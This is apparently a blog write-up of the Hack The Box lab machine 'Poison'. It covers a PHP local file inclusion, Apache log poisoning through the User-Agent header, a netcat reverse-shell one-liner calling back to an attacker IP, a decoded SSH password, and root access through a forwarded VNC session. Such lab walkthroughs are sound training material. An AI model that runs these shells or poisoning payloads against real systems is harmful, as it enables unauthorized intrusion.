---
layout: post
title: "HTB Writeup - Poison"
date: 2019-12-14 12:59:50 +0000
---

# HTB writeup - Poison
<br />
Let's start with the usual scan:
```
root@kali:~# nmap -sC -sV 10.10.10.84
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 11:08 CET
Nmap scan report for 10.10.10.84
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.34 seconds
```
<br />
There is port 22 and 80 open, with nothing out of place. We can see that likely the system is running FreeBSD and php 5.6.
<br />
http://10.10.10.84
<img src="/assets/poison/poison1.png" alt="drawing" width="600"/>

We test the parameter we saw in the home:
<img src="/assets/poison/poison2.png" alt="drawing" width="600"/>

Not good, as we can see, the application is probably vulnerable to some kind of inclusion/traversal:
<img src="/assets/poison/poison3.png" alt="drawing" width="600"/>

If we input "index.php", the file gets executed, therefore if we want to see the source code we can use this filter:
<img src="/assets/poison/poison4.png" alt="drawing" width="600"/>
<br />
```
<html>
<body>
<h1>Temporary website to test local .php scripts.</h1>
Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php

</body>
</html>

<form action="/browse.php" method="GET">
	Scriptname: <input type="text" name="file"><br>
	<input type="submit" value="Submit">
</form>
```
<br />
browse.php:
```
<?php
include($_GET['file']);
?>
```
After some test, I concluded that it was a LFI, not a RFI.

Now that we have a LFI, and the application doesn't have an upload, we need to poison (hence the name of the box ;) ) some log in order to get a RCE.

Since the system is a FreeBSD, I looked up the location on the internet to find out the locations of logs:
```
/var/log/apache2/
/var/log/httpd-access.log
```
<img src="/assets/poison/poison5.png" alt="drawing" width="600"/>

As we can see, the user agent is in the access file, we can manipulate that. 
<img src="/assets/poison/poison6.png" alt="drawing" width="600"/>

I used this one-liner shell:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >/tmp/f
```
<img src="/assets/poison/poison7.png" alt="drawing" width="600"/>

```
manfredi@manfredi-Blade:~$ for i in {1..13}; do echo -n '| base64 -d';done
| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d

manfredi@manfredi-Blade:~$ cat pwd | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d
Charix!2#4%6&8(0
```
I used this password to access ssh and it worked.
<br />

# Privesc - Root Flag
<br />
I did some enumeration on the box:
```
charix@Poison:~ % ps aux | grep root 
root    11 100.0  0.0     0    16  -  RL   19:56   35:10.79 [idle]
root     0   0.0  0.0     0   160  -  DLs  19:56    0:00.00 [kernel]
root     1   0.0  0.1  5408  1040  -  ILs  19:56    0:00.00 /sbin/init --
root     2   0.0  0.0     0    16  -  DL   19:56    0:00.00 [crypto]
root     3   0.0  0.0     0    16  -  DL   19:56    0:00.00 [crypto returns]
root     4   0.0  0.0     0    32  -  DL   19:56    0:00.06 [cam]
root     5   0.0  0.0     0    16  -  DL   19:56    0:00.00 [mpt_recovery0]
root     6   0.0  0.0     0    16  -  DL   19:56    0:00.00 [sctp_iterator]
root     7   0.0  0.0     0    16  -  DL   19:56    0:01.23 [rand_harvestq]
root     8   0.0  0.0     0    16  -  DL   19:56    0:00.00 [soaiod1]
root     9   0.0  0.0     0    16  -  DL   19:56    0:00.00 [soaiod2]
root    10   0.0  0.0     0    16  -  DL   19:56    0:00.00 [audit]
root    12   0.0  0.1     0   736  -  WL   19:56    0:00.67 [intr]
root    13   0.0  0.0     0    48  -  DL   19:56    0:00.00 [geom]
root    14   0.0  0.0     0   160  -  DL   19:56    0:00.10 [usb]
root    15   0.0  0.0     0    16  -  DL   19:56    0:00.00 [soaiod3]
root    16   0.0  0.0     0    16  -  DL   19:56    0:00.00 [soaiod4]
root    17   0.0  0.0     0    48  -  DL   19:56    0:00.03 [pagedaemon]
root    18   0.0  0.0     0    16  -  DL   19:56    0:00.00 [vmdaemon]
root    19   0.0  0.0     0    16  -  DL   19:56    0:00.00 [pagezero]
root    20   0.0  0.0     0    32  -  DL   19:56    0:00.02 [bufdaemon]
root    21   0.0  0.0     0    16  -  DL   19:56    0:00.00 [bufspacedaemon]
root    22   0.0  0.0     0    16  -  DL   19:56    0:00.03 [syncer]
root    23   0.0  0.0     0    16  -  DL   19:56    0:00.00 [vnlru]
root   319   0.0  0.5  9560  5052  -  Ss   19:56    0:00.10 /sbin/devd
root   390   0.0  0.2 10500  2448  -  Ss   19:56    0:00.04 /usr/sbin/syslogd -s
root   543   0.0  0.5 56320  5396  -  S    19:56    0:01.01 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p 
root   620   0.0  0.7 57812  7052  -  Is   19:56    0:00.01 /usr/sbin/sshd
root   630   0.0  1.1 99172 11516  -  Ss   19:57    0:00.05 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   647   0.0  0.6 20636  6204  -  Ss   19:58    0:00.03 sendmail: accepting connections (sendmail)
root   654   0.0  0.2 12592  2436  -  Is   19:59    0:00.01 /usr/sbin/cron -s
root   737   0.0  0.8 85228  7832  -  Is   20:13    0:00.01 sshd: charix [priv] (sshd)
root   529   0.0  0.9 23620  8872 v0- I    19:56    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root
```

As we can see there is a XVNC process running as root on port 5801:
```
charix@Poison:~ % sockstat -l | grep Xvnc
root     Xvnc       529   0  stream /tmp/.X11-unix/X1
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
```
Since the port 5901 is only open for localhost, I had to forward the connection with ssh:
```
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```
This means that the traffic directed to my local port 5901 will be forwarded to the 5901 on the remote server.

At this point I had to connect with vncviewer using a file I found in the home directory of charix:
```
vncviewer 127.0.0.1:5901 -passwd secret
```
and I was root :)
<img src="/assets/poison/poison8.png" alt="drawing" width="600"/>

